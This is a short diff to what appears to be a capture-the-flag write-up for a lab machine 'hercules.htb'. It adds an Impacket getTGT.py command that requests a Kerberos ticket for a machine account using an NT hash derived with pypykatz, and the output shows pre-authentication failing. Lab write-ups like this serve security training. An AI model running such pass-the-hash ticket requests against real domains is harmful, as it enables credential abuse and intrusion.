@@ -1587,7 +1587,10 @@ export KRB5CCNAME=iiswebserver.ccache
 Then ill export it!
 
 ```python
+getTGT.py -hashes :$(pypykatz crypto nt 'Password123!') "hercules.htb/iis_webserver$"
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
+Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
 ```
 
 The first step is to convert the password i set to an NTLM
